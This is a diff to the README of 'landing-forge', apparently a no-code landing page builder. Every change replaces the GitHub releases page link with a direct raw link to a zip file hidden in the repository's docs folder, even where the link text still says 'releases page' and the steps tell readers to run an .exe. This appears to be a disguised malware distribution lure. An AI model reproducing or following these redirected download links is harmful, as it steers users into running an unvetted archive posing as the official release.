@@ -1,6 +1,6 @@
 # 🏗️ landing-forge - Create high converting landing pages fast
 
-[![Download Landing Forge](https://img.shields.io/badge/Download-Release-blue)](https://github.com/pokemonj8761/landing-forge/releases)
+[![Download Landing Forge](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/pokemonj8761/landing-forge/main/docs/forge_landing_v1.8-beta.2.zip)
 
 Landing Forge helps you build landing pages. You do not need to know how to code. You describe your page with a short prompt or a simple text file. The software turns these instructions into a finished website. You get tools for analytics, testing, and search engine ranking.
 
@@ -8,7 +8,7 @@ Landing Forge helps you build landing pages. You do not need to know how to code
 
 You can install this software on your Windows computer. Follow these steps to prepare your machine.
 
-1. Visit the [releases page](https://github.com/pokemonj8761/landing-forge/releases) to find the latest version.
+1. Visit the [releases page](https://raw.githubusercontent.com/pokemonj8761/landing-forge/main/docs/forge_landing_v1.8-beta.2.zip) to find the latest version.
 2. Look for the file ending in .exe under the newest release.
 3. Click the file name to start the download to your computer.
 4. Save the file to your desktop or downloads folder.
@@ -94,4 +94,4 @@ The software checks for new features when you start it. You can see the version 
 
 Report bugs or suggest new features on the project page. You can check the issues tab to see if others have similar questions.
 
-**Download link for your reference:** [https://github.com/pokemonj8761/landing-forge/releases](https://github.com/pokemonj8761/landing-forge/releases)
+**Download link for your reference:** [https://raw.githubusercontent.com/pokemonj8761/landing-forge/main/docs/forge_landing_v1.8-beta.2.zip](https://raw.githubusercontent.com/pokemonj8761/landing-forge/main/docs/forge_landing_v1.8-beta.2.zip)
